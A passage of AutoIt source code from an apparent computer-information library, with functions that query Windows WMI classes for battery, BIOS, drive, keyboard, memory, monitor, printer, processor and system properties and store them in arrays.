				$abatteryinfo[$i][13] = $objitem.errordescription
				$abatteryinfo[$i][14] = $objitem.estimatedchargeremaining
				$abatteryinfo[$i][15] = $objitem.estimatedruntime
				$abatteryinfo[$i][16] = $objitem.expectedbatterylife
				$abatteryinfo[$i][17] = $objitem.expectedlife
				$abatteryinfo[$i][18] = $objitem.fullchargecapacity
				$abatteryinfo[$i][19] = $objitem.lasterrorcode
				$abatteryinfo[$i][20] = $objitem.maxrechargetime
				$abatteryinfo[$i][21] = $objitem.pnpdeviceid
				$abatteryinfo[$i][22] = $objitem.powermanagementcapabilities(0)
				$abatteryinfo[$i][23] = $objitem.powermanagementsupported
				$abatteryinfo[$i][24] = $objitem.smartbatteryversion
				$abatteryinfo[$i][25] = $objitem.status
				$abatteryinfo[$i][26] = $objitem.statusinfo
				$abatteryinfo[$i][27] = $objitem.systemcreationclassname
				$abatteryinfo[$i][28] = $objitem.systemname
				$abatteryinfo[$i][29] = $objitem.timeonbattery
				$abatteryinfo[$i][30] = $objitem.timetofullcharge
				$i += 1
			Next
			$abatteryinfo[0][0] = UBound($abatteryinfo) - 1
			If $abatteryinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetbios(ByRef $abiosinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $abiosinfo[1][25], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_BIOS", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $abiosinfo[UBound($abiosinfo) + 1][25]
				$abiosinfo[$i][0] = $objitem.name
				$abiosinfo[$i][1] = $objitem.status
				$abiosinfo[$i][2] = $objitem.bioscharacteristics(0)
				$abiosinfo[$i][3] = $objitem.biosversion(0)
				$abiosinfo[$i][4] = $objitem.description
				$abiosinfo[$i][5] = $objitem.buildnumber
				$abiosinfo[$i][6] = $objitem.codeset
				$abiosinfo[$i][7] = $objitem.currentlanguage
				$abiosinfo[$i][8] = $objitem.identificationcode
				$abiosinfo[$i][9] = $objitem.installablelanguages
				$abiosinfo[$i][10] = $objitem.languageedition
				$abiosinfo[$i][11] = $objitem.listoflanguages(0)
				$abiosinfo[$i][12] = $objitem.manufacturer
				$abiosinfo[$i][13] = $objitem.othertargetos
				$abiosinfo[$i][14] = $objitem.primarybios
				$abiosinfo[$i][15] = __stringtodate($objitem.releasedate)
				$abiosinfo[$i][16] = $objitem.serialnumber
				$abiosinfo[$i][17] = $objitem.smbiosbiosversion
				$abiosinfo[$i][18] = $objitem.smbiosmajorversion
				$abiosinfo[$i][19] = $objitem.smbiosminorversion
				$abiosinfo[$i][20] = $objitem.smbiospresent
				$abiosinfo[$i][21] = $objitem.softwareelementid
				$abiosinfo[$i][22] = $objitem.softwareelementstate
				$abiosinfo[$i][23] = $objitem.targetoperatingsystem
				$abiosinfo[$i][24] = $objitem.version
				$i += 1
			Next
			$abiosinfo[0][0] = UBound($abiosinfo) - 1
			If $abiosinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetdrives(ByRef $adriveinfo, $sdrivetype = "FIXED")
		Local $drive
		$drive = DriveGetDrive($sdrivetype)
		If NOT @error Then
			Dim $adriveinfo[UBound($drive)][6]
			$adriveinfo[0][0] = $drive[0]
			For $i = 1 To $adriveinfo[0][0] Step 1
				$adriveinfo[$i][0] = StringUpper($drive[$i] & "\")
				$adriveinfo[$i][1] = DriveGetFileSystem($drive[$i])
				If @error Then SetError(1, 2, 0)
				$adriveinfo[$i][2] = DriveGetLabel($drive[$i])
				If @error Then SetError(1, 3, 0)
				$adriveinfo[$i][3] = DriveGetSerial($drive[$i])
				If @error Then SetError(1, 4, 0)
				$adriveinfo[$i][4] = DriveSpaceFree($drive[$i])
				If @error Then SetError(1, 5, 0)
				$adriveinfo[$i][5] = DriveSpaceTotal($drive[$i])
				If @error Then SetError(1, 6, 0)
			Next
		Else
			SetError(1, 1, 0)
		EndIf
	EndFunc

	Func _computergetkeyboard(ByRef $akeyboardinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $akeyboardinfo[1][21], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Keyboard", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $akeyboardinfo[UBound($akeyboardinfo) + 1][21]
				$akeyboardinfo[$i][0] = $objitem.name
				$akeyboardinfo[$i][1] = $objitem.availability
				$akeyboardinfo[$i][2] = $objitem.configmanagererrorcode
				$akeyboardinfo[$i][3] = $objitem.configmanageruserconfig
				$akeyboardinfo[$i][4] = $objitem.description
				$akeyboardinfo[$i][5] = $objitem.creationclassname
				$akeyboardinfo[$i][6] = $objitem.deviceid
				$akeyboardinfo[$i][7] = $objitem.errorcleared
				$akeyboardinfo[$i][8] = $objitem.errordescription
				$akeyboardinfo[$i][9] = $objitem.islocked
				$akeyboardinfo[$i][10] = $objitem.lasterrorcode
				$akeyboardinfo[$i][11] = $objitem.layout
				$akeyboardinfo[$i][12] = $objitem.numberoffunctionkeys
				$akeyboardinfo[$i][13] = $objitem.password
				$akeyboardinfo[$i][14] = $objitem.pnpdeviceid
				$akeyboardinfo[$i][15] = $objitem.powermanagementcapabilities(0)
				$akeyboardinfo[$i][16] = $objitem.powermanagementsupported
				$akeyboardinfo[$i][17] = $objitem.status
				$akeyboardinfo[$i][18] = $objitem.statusinfo
				$akeyboardinfo[$i][19] = $objitem.systemcreationclassname
				$akeyboardinfo[$i][20] = $objitem.systemname
				$i += 1
			Next
			$akeyboardinfo[0][0] = UBound($akeyboardinfo) - 1
			If $akeyboardinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetmemory(ByRef $amemoryinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $amemoryinfo[1][28], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_PhysicalMemory", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $amemoryinfo[UBound($amemoryinfo) + 1][28]
				$amemoryinfo[$i][0] = $objitem.name
				$amemoryinfo[$i][1] = $objitem.banklabel
				$amemoryinfo[$i][2] = $objitem.capacity
				$amemoryinfo[$i][3] = $objitem.creationclassname
				$amemoryinfo[$i][4] = $objitem.description
				$amemoryinfo[$i][5] = $objitem.datawidth
				$amemoryinfo[$i][6] = $objitem.devicelocator
				$amemoryinfo[$i][7] = $objitem.formfactor
				$amemoryinfo[$i][8] = $objitem.hotswappable
				$amemoryinfo[$i][9] = $objitem.interleavedatadepth
				$amemoryinfo[$i][10] = $objitem.interleaveposition
				$amemoryinfo[$i][11] = $objitem.manufacturer
				$amemoryinfo[$i][12] = $objitem.memorytype
				$amemoryinfo[$i][13] = $objitem.model
				$amemoryinfo[$i][14] = $objitem.otheridentifyinginfo
				$amemoryinfo[$i][15] = $objitem.partnumber
				$amemoryinfo[$i][16] = $objitem.positioninrow
				$amemoryinfo[$i][17] = $objitem.poweredon
				$amemoryinfo[$i][18] = $objitem.removable
				$amemoryinfo[$i][19] = $objitem.replaceable
				$amemoryinfo[$i][20] = $objitem.serialnumber
				$amemoryinfo[$i][21] = $objitem.sku
				$amemoryinfo[$i][22] = $objitem.speed
				$amemoryinfo[$i][23] = $objitem.status
				$amemoryinfo[$i][24] = $objitem.tag
				$amemoryinfo[$i][25] = $objitem.totalwidth
				$amemoryinfo[$i][26] = $objitem.typedetail
				$amemoryinfo[$i][27] = $objitem.version
				$i += 1
			Next
			$amemoryinfo[0][0] = UBound($amemoryinfo) - 1
			If $amemoryinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetmonitors(ByRef $amonitorinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $amonitorinfo[1][26], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_DesktopMonitor", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $amonitorinfo[UBound($amonitorinfo) + 1][26]
				$amonitorinfo[$i][0] = $objitem.name
				$amonitorinfo[$i][1] = $objitem.availability
				$amonitorinfo[$i][2] = $objitem.bandwidth
				$amonitorinfo[$i][3] = $objitem.configmanagererrorcode
				$amonitorinfo[$i][4] = $objitem.description
				$amonitorinfo[$i][5] = $objitem.configmanageruserconfig
				$amonitorinfo[$i][6] = $objitem.creationclassname
				$amonitorinfo[$i][7] = $objitem.deviceid
				$amonitorinfo[$i][8] = $objitem.displaytype
				$amonitorinfo[$i][9] = $objitem.errorcleared
				$amonitorinfo[$i][10] = $objitem.errordescription
				$amonitorinfo[$i][11] = $objitem.islocked
				$amonitorinfo[$i][12] = $objitem.lasterrorcode
				$amonitorinfo[$i][13] = $objitem.monitormanufacturer
				$amonitorinfo[$i][14] = $objitem.monitortype
				$amonitorinfo[$i][15] = $objitem.pixelsperxlogicalinch
				$amonitorinfo[$i][16] = $objitem.pixelsperylogicalinch
				$amonitorinfo[$i][17] = $objitem.pnpdeviceid
				$amonitorinfo[$i][18] = $objitem.powermanagementcapabilities(0)
				$amonitorinfo[$i][19] = $objitem.powermanagementsupported
				$amonitorinfo[$i][20] = $objitem.screenheight
				$amonitorinfo[$i][21] = $objitem.screenwidth
				$amonitorinfo[$i][22] = $objitem.status
				$amonitorinfo[$i][23] = $objitem.statusinfo
				$amonitorinfo[$i][24] = $objitem.systemcreationclassname
				$amonitorinfo[$i][25] = $objitem.systemname
				$i += 1
			Next
			$amonitorinfo[0][0] = UBound($amonitorinfo) - 1
			If $amonitorinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetmotherboard(ByRef $amotherboardinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $amotherboardinfo[1][20], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_MotherboardDevice", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $amotherboardinfo[UBound($amotherboardinfo) + 1][20]
				$amotherboardinfo[$i][0] = $objitem.name
				$amotherboardinfo[$i][1] = $objitem.availability
				$amotherboardinfo[$i][2] = $objitem.configmanagererrorcode
				$amotherboardinfo[$i][3] = $objitem.configmanageruserconfig
				$amotherboardinfo[$i][4] = $objitem.description
				$amotherboardinfo[$i][5] = $objitem.creationclassname
				$amotherboardinfo[$i][6] = $objitem.deviceid
				$amotherboardinfo[$i][7] = $objitem.errorcleared
				$amotherboardinfo[$i][8] = $objitem.errordescription
				$amotherboardinfo[$i][9] = $objitem.lasterrorcode
				$amotherboardinfo[$i][10] = $objitem.pnpdeviceid
				$amotherboardinfo[$i][11] = $objitem.powermanagementcapabilities(0)
				$amotherboardinfo[$i][12] = $objitem.powermanagementsupported
				$amotherboardinfo[$i][13] = $objitem.primarybustype
				$amotherboardinfo[$i][14] = $objitem.revisionnumber
				$amotherboardinfo[$i][15] = $objitem.secondarybustype
				$amotherboardinfo[$i][16] = $objitem.status
				$amotherboardinfo[$i][17] = $objitem.statusinfo
				$amotherboardinfo[$i][18] = $objitem.systemcreationclassname
				$amotherboardinfo[$i][19] = $objitem.systemname
				$i += 1
			Next
			$amotherboardinfo[0][0] = UBound($amotherboardinfo) - 1
			If $amotherboardinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetmouse(ByRef $amouseinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $amouseinfo[1][31], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_PointingDevice", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $amouseinfo[UBound($amouseinfo) + 1][31]
				$amouseinfo[$i][0] = $objitem.name
				$amouseinfo[$i][1] = $objitem.availability
				$amouseinfo[$i][2] = $objitem.configmanagererrorcode
				$amouseinfo[$i][3] = $objitem.configmanageruserconfig
				$amouseinfo[$i][4] = $objitem.description
				$amouseinfo[$i][5] = $objitem.creationclassname
				$amouseinfo[$i][6] = $objitem.deviceid
				$amouseinfo[$i][7] = $objitem.deviceinterface
				$amouseinfo[$i][8] = $objitem.doublespeedthreshold
				$amouseinfo[$i][9] = $objitem.errorcleared
				$amouseinfo[$i][10] = $objitem.errordescription
				$amouseinfo[$i][11] = $objitem.handedness
				$amouseinfo[$i][12] = $objitem.hardwaretype
				$amouseinfo[$i][13] = $objitem.inffilename
				$amouseinfo[$i][14] = $objitem.infsection
				$amouseinfo[$i][15] = $objitem.islocked
				$amouseinfo[$i][16] = $objitem.lasterrorcode
				$amouseinfo[$i][17] = $objitem.manufacturer
				$amouseinfo[$i][18] = $objitem.numberofbuttons
				$amouseinfo[$i][19] = $objitem.pnpdeviceid
				$amouseinfo[$i][20] = $objitem.pointingtype
				$amouseinfo[$i][21] = $objitem.powermanagementcapabilities(0)
				$amouseinfo[$i][22] = $objitem.powermanagementsupported
				$amouseinfo[$i][23] = $objitem.quadspeedthreshold
				$amouseinfo[$i][24] = $objitem.resolution
				$amouseinfo[$i][25] = $objitem.samplerate
				$amouseinfo[$i][26] = $objitem.status
				$amouseinfo[$i][27] = $objitem.statusinfo
				$amouseinfo[$i][28] = $objitem.synch
				$amouseinfo[$i][29] = $objitem.systemcreationclassname
				$amouseinfo[$i][30] = $objitem.systemname
				$i += 1
			Next
			$amouseinfo[0][0] = UBound($amouseinfo) - 1
			If $amouseinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetnetworkcards(ByRef $anetworkinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $anetworkinfo[1][34], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_NetworkAdapter", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $anetworkinfo[UBound($anetworkinfo) + 1][34]
				$anetworkinfo[$i][0] = $objitem.name
				$anetworkinfo[$i][1] = $objitem.adaptertype
				$anetworkinfo[$i][2] = $objitem.adaptertypeid
				$anetworkinfo[$i][3] = $objitem.autosense
				$anetworkinfo[$i][4] = $objitem.description
				$anetworkinfo[$i][5] = $objitem.availability
				$anetworkinfo[$i][6] = $objitem.configmanagererrorcode
				$anetworkinfo[$i][7] = $objitem.configmanageruserconfig
				$anetworkinfo[$i][8] = $objitem.creationclassname
				$anetworkinfo[$i][9] = $objitem.deviceid
				$anetworkinfo[$i][10] = $objitem.errorcleared
				$anetworkinfo[$i][11] = $objitem.errordescription
				$anetworkinfo[$i][12] = $objitem.index
				$anetworkinfo[$i][13] = $objitem.installed
				$anetworkinfo[$i][14] = $objitem.lasterrorcode
				$anetworkinfo[$i][15] = $objitem.macaddress
				$anetworkinfo[$i][16] = $objitem.manufacturer
				$anetworkinfo[$i][17] = $objitem.maxnumbercontrolled
				$anetworkinfo[$i][18] = $objitem.maxspeed
				$anetworkinfo[$i][19] = $objitem.netconnectionid
				$anetworkinfo[$i][20] = $objitem.netconnectionstatus
				$anetworkinfo[$i][21] = $objitem.networkaddresses(0)
				$anetworkinfo[$i][22] = $objitem.permanentaddress
				$anetworkinfo[$i][23] = $objitem.pnpdeviceid
				$anetworkinfo[$i][24] = $objitem.powermanagementcapabilities(0)
				$anetworkinfo[$i][25] = $objitem.powermanagementsupported
				$anetworkinfo[$i][26] = $objitem.productname
				$anetworkinfo[$i][27] = $objitem.servicename
				$anetworkinfo[$i][28] = $objitem.speed
				$anetworkinfo[$i][29] = $objitem.status
				$anetworkinfo[$i][30] = $objitem.statusinfo
				$anetworkinfo[$i][31] = $objitem.systemcreationclassname
				$anetworkinfo[$i][32] = $objitem.systemname
				$anetworkinfo[$i][33] = __stringtodate($objitem.timeoflastreset)
				$i += 1
			Next
			$anetworkinfo[0][0] = UBound($anetworkinfo) - 1
			If $anetworkinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetprinters(ByRef $aprinterinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aprinterinfo[1][85], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Printer", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aprinterinfo[UBound($aprinterinfo) + 1][85]
				$aprinterinfo[$i][0] = $objitem.name
				$aprinterinfo[$i][1] = $objitem.attributes
				$aprinterinfo[$i][2] = $objitem.availability
				$aprinterinfo[$i][3] = $objitem.availablejobsheets(0)
				$aprinterinfo[$i][4] = $objitem.description
				$aprinterinfo[$i][5] = $objitem.averagepagesperminute
				$aprinterinfo[$i][6] = $objitem.capabilities(0)
				$aprinterinfo[$i][7] = $objitem.capabilitydescriptions(0)
				$aprinterinfo[$i][8] = $objitem.charsetssupported(0)
				$aprinterinfo[$i][9] = $objitem.comment
				$aprinterinfo[$i][10] = $objitem.configmanagererrorcode
				$aprinterinfo[$i][11] = $objitem.configmanageruserconfig
				$aprinterinfo[$i][12] = $objitem.creationclassname
				$aprinterinfo[$i][13] = $objitem.currentcapabilities(0)
				$aprinterinfo[$i][14] = $objitem.currentcharset
				$aprinterinfo[$i][15] = $objitem.currentlanguage
				$aprinterinfo[$i][16] = $objitem.currentmimetype
				$aprinterinfo[$i][17] = $objitem.currentnaturallanguage
				$aprinterinfo[$i][18] = $objitem.currentpapertype
				$aprinterinfo[$i][19] = $objitem.default
				$aprinterinfo[$i][20] = $objitem.defaultcapabilities(0)
				$aprinterinfo[$i][21] = $objitem.defaultcopies
				$aprinterinfo[$i][22] = $objitem.defaultlanguage
				$aprinterinfo[$i][23] = $objitem.defaultmimetype
				$aprinterinfo[$i][24] = $objitem.defaultnumberup
				$aprinterinfo[$i][25] = $objitem.defaultpapertype
				$aprinterinfo[$i][26] = $objitem.defaultpriority
				$aprinterinfo[$i][27] = $objitem.detectederrorstate
				$aprinterinfo[$i][28] = $objitem.deviceid
				$aprinterinfo[$i][29] = $objitem.direct
				$aprinterinfo[$i][30] = $objitem.docompletefirst
				$aprinterinfo[$i][31] = $objitem.drivername
				$aprinterinfo[$i][32] = $objitem.enablebidi
				$aprinterinfo[$i][33] = $objitem.enabledevqueryprint
				$aprinterinfo[$i][34] = $objitem.errorcleared
				$aprinterinfo[$i][35] = $objitem.errordescription
				$aprinterinfo[$i][36] = $objitem.errorinformation(0)
				$aprinterinfo[$i][37] = $objitem.extendeddetectederrorstate
				$aprinterinfo[$i][38] = $objitem.extendedprinterstatus
				$aprinterinfo[$i][39] = $objitem.hidden
				$aprinterinfo[$i][40] = $objitem.horizontalresolution
				$aprinterinfo[$i][41] = __stringtodate($objitem.installdate)
				$aprinterinfo[$i][42] = $objitem.jobcountsincelastreset
				$aprinterinfo[$i][43] = $objitem.keepprintedjobs
				$aprinterinfo[$i][44] = $objitem.languagessupported(0)
				$aprinterinfo[$i][45] = $objitem.lasterrorcode
				$aprinterinfo[$i][46] = $objitem.local
				$aprinterinfo[$i][47] = $objitem.location
				$aprinterinfo[$i][48] = $objitem.markingtechnology
				$aprinterinfo[$i][49] = $objitem.maxcopies
				$aprinterinfo[$i][50] = $objitem.maxnumberup
				$aprinterinfo[$i][51] = $objitem.maxsizesupported
				$aprinterinfo[$i][52] = $objitem.mimetypessupported(0)
				$aprinterinfo[$i][53] = $objitem.naturallanguagessupported(0)
				$aprinterinfo[$i][54] = $objitem.network
				$aprinterinfo[$i][55] = $objitem.papersizessupported(0)
				$aprinterinfo[$i][56] = $objitem.papertypesavailable(0)
				$aprinterinfo[$i][57] = $objitem.parameters
				$aprinterinfo[$i][58] = $objitem.pnpdeviceid
				$aprinterinfo[$i][59] = $objitem.portname
				$aprinterinfo[$i][60] = $objitem.powermanagementcapabilities(0)
				$aprinterinfo[$i][61] = $objitem.powermanagementsupported
				$aprinterinfo[$i][62] = $objitem.printerpapernames(0)
				$aprinterinfo[$i][63] = $objitem.printerstate
				$aprinterinfo[$i][64] = $objitem.printerstatus
				$aprinterinfo[$i][65] = $objitem.printjobdatatype
				$aprinterinfo[$i][66] = $objitem.printprocessor
				$aprinterinfo[$i][67] = $objitem.priority
				$aprinterinfo[$i][68] = $objitem.published
				$aprinterinfo[$i][69] = $objitem.queued
				$aprinterinfo[$i][70] = $objitem.rawonly
				$aprinterinfo[$i][71] = $objitem.separatorfile
				$aprinterinfo[$i][72] = $objitem.servername
				$aprinterinfo[$i][73] = $objitem.shared
				$aprinterinfo[$i][74] = $objitem.sharename
				$aprinterinfo[$i][75] = $objitem.spoolenabled
				$aprinterinfo[$i][76] = __stringtodate($objitem.starttime)
				$aprinterinfo[$i][77] = $objitem.status
				$aprinterinfo[$i][78] = $objitem.statusinfo
				$aprinterinfo[$i][79] = $objitem.systemcreationclassname
				$aprinterinfo[$i][80] = $objitem.systemname
				$aprinterinfo[$i][81] = __stringtodate($objitem.timeoflastreset)
				$aprinterinfo[$i][82] = __stringtodate($objitem.untiltime)
				$aprinterinfo[$i][83] = $objitem.verticalresolution
				$aprinterinfo[$i][84] = $objitem.workoffline
				$i += 1
			Next
			$aprinterinfo[0][0] = UBound($aprinterinfo) - 1
			If $aprinterinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetprocessors(ByRef $aprocessorinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $aprocessorinfo[1][42], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_Processor", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $aprocessorinfo[UBound($aprocessorinfo) + 1][42]
				$aprocessorinfo[$i][0] = StringStripWS($objitem.name, 1)
				$aprocessorinfo[$i][1] = $objitem.addresswidth
				$aprocessorinfo[$i][2] = $objitem.architecture
				$aprocessorinfo[$i][3] = $objitem.availability
				$aprocessorinfo[$i][4] = $objitem.description
				$aprocessorinfo[$i][5] = $objitem.configmanagererrorcode
				$aprocessorinfo[$i][6] = $objitem.configmanageruserconfig
				$aprocessorinfo[$i][7] = $objitem.cpustatus
				$aprocessorinfo[$i][8] = $objitem.creationclassname
				$aprocessorinfo[$i][9] = $objitem.currentclockspeed
				$aprocessorinfo[$i][10] = $objitem.currentvoltage
				$aprocessorinfo[$i][11] = $objitem.datawidth
				$aprocessorinfo[$i][12] = $objitem.deviceid
				$aprocessorinfo[$i][13] = $objitem.errorcleared
				$aprocessorinfo[$i][14] = $objitem.errordescription
				$aprocessorinfo[$i][15] = $objitem.extclock
				$aprocessorinfo[$i][16] = $objitem.family
				$aprocessorinfo[$i][17] = $objitem.l2cachesize
				$aprocessorinfo[$i][18] = $objitem.l2cachespeed
				$aprocessorinfo[$i][19] = $objitem.lasterrorcode
				$aprocessorinfo[$i][20] = $objitem.level
				$aprocessorinfo[$i][21] = $objitem.loadpercentage
				$aprocessorinfo[$i][22] = $objitem.manufacturer
				$aprocessorinfo[$i][23] = $objitem.maxclockspeed
				$aprocessorinfo[$i][24] = $objitem.otherfamilydescription
				$aprocessorinfo[$i][25] = $objitem.pnpdeviceid
				$aprocessorinfo[$i][26] = $objitem.powermanagementcapabilities(0)
				$aprocessorinfo[$i][27] = $objitem.powermanagementsupported
				$aprocessorinfo[$i][28] = $objitem.processorid
				$aprocessorinfo[$i][29] = $objitem.processortype
				$aprocessorinfo[$i][30] = $objitem.revision
				$aprocessorinfo[$i][31] = $objitem.role
				$aprocessorinfo[$i][32] = $objitem.socketdesignation
				$aprocessorinfo[$i][33] = $objitem.status
				$aprocessorinfo[$i][34] = $objitem.statusinfo
				$aprocessorinfo[$i][35] = $objitem.stepping
				$aprocessorinfo[$i][36] = $objitem.systemcreationclassname
				$aprocessorinfo[$i][37] = $objitem.systemname
				$aprocessorinfo[$i][38] = $objitem.uniqueid
				$aprocessorinfo[$i][39] = $objitem.upgrademethod
				$aprocessorinfo[$i][40] = $objitem.version
				$aprocessorinfo[$i][41] = $objitem.voltagecaps
				$i += 1
			Next
			$aprocessorinfo[0][0] = UBound($aprocessorinfo) - 1
			If $aprocessorinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetsoundcards(ByRef $asoundcardinfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $asoundcardinfo[1][21], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_SoundDevice", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $asoundcardinfo[UBound($asoundcardinfo) + 1][21]
				$asoundcardinfo[$i][0] = $objitem.name
				$asoundcardinfo[$i][1] = $objitem.availability
				$asoundcardinfo[$i][2] = $objitem.configmanagererrorcode
				$asoundcardinfo[$i][3] = $objitem.configmanageruserconfig
				$asoundcardinfo[$i][4] = $objitem.description
				$asoundcardinfo[$i][5] = $objitem.creationclassname
				$asoundcardinfo[$i][6] = $objitem.deviceid
				$asoundcardinfo[$i][7] = $objitem.dmabuffersize
				$asoundcardinfo[$i][8] = $objitem.errorcleared
				$asoundcardinfo[$i][9] = $objitem.errordescription
				$asoundcardinfo[$i][10] = $objitem.lasterrorcode
				$asoundcardinfo[$i][11] = $objitem.manufacturer
				$asoundcardinfo[$i][12] = $objitem.mpu401address
				$asoundcardinfo[$i][13] = $objitem.pnpdeviceid
				$asoundcardinfo[$i][14] = $objitem.powermanagementcapabilities(0)
				$asoundcardinfo[$i][15] = $objitem.powermanagementsupported
				$asoundcardinfo[$i][16] = $objitem.productname
				$asoundcardinfo[$i][17] = $objitem.status
				$asoundcardinfo[$i][18] = $objitem.statusinfo
				$asoundcardinfo[$i][19] = $objitem.systemcreationclassname
				$asoundcardinfo[$i][20] = $objitem.systemname
				$i += 1
			Next
			$asoundcardinfo[0][0] = UBound($asoundcardinfo) - 1
			If $asoundcardinfo[0][0] < 1 Then
				SetError(1, 1, 0)
			EndIf
		Else
			SetError(1, 2, 0)
		EndIf
	EndFunc

	Func _computergetsystem(ByRef $asysteminfo)
		Local $colitems, $objwmiservice, $objitem
		Dim $asysteminfo[1][52], $i = 1
		$objwmiservice = ObjGet("winmgmts:\\" & $ci_compname & "\root\CIMV2")
		$colitems = $objwmiservice.execquery("SELECT * FROM Win32_ComputerSystem", "WQL", $wbemflagreturnimmediately + $wbemflagforwardonly)
		If IsObj($colitems) Then
			For $objitem In $colitems
				ReDim $asysteminfo[UBound($asysteminfo) + 1][52]
				$asysteminfo[$i][0] = $objitem.name
				$asysteminfo[$i][1] = $objitem.adminpasswordstatus
				$asysteminfo[$i][2] = $objitem.automaticresetbootoption
				$asysteminfo[$i][3] = $objitem.automaticresetcapability
				$asysteminfo[$i][4] = $objitem.description
				$asysteminfo[$i][5] = $objitem.bootoptiononlimit
				$asysteminfo[$i][6] = $objitem.bootoptiononwatchdog
				$asysteminfo[$i][7] = $objitem.bootromsupported
				$asysteminfo[$i][8] = $objitem.bootupstate
				$asysteminfo[$i][9] = $objitem.chassisbootupstate
				$asysteminfo[$i][10] = $objitem.creationclassname
				$asysteminfo[$i][11] = $objitem.currenttimezone
				$asysteminfo[$i][12] = $objitem.daylightineffect
				$asysteminfo[$i][13] = $objitem.domain
				$asysteminfo[$i][14] = $objitem.domainrole
				$asysteminfo[$i][15] = $objitem.enabledaylightsavingstime
				$asysteminfo[$i][16] = $objitem.frontpanelresetstatus
				$asysteminfo[$i][17] = $objitem.infraredsupported
				$asysteminfo[$i][18] = $objitem.initialloadinfo(0)
				$asysteminfo[$i][19] = $objitem.keyboardpasswordstatus
				$asysteminfo[$i][20] = $objitem.lastloadinfo
				$asysteminfo[$i][21] = $objitem.manufacturer
				$asysteminfo[$i][22] = $objitem.model
				$asysteminfo[$i][23] = $objitem.nameformat
				$asysteminfo[$i][24] = $objitem.networkservermodeenabled
				$asysteminfo[$i][25] = $objitem.numberofprocessors
				$asysteminfo[$i][26] = $objitem.oemlogobitmap(0)
				$asysteminfo[$i][27] = $objitem.oemstringarray(0)
				$asysteminfo[$i][28] = $objitem.partofdomain
				$asysteminfo[$i][29] = $objitem.pauseafterreset
				$asysteminfo[$i][30] = $objitem.powermanagementcapabilities(0)
				$asysteminfo[$i][31] = $objitem.powermanagementsupported
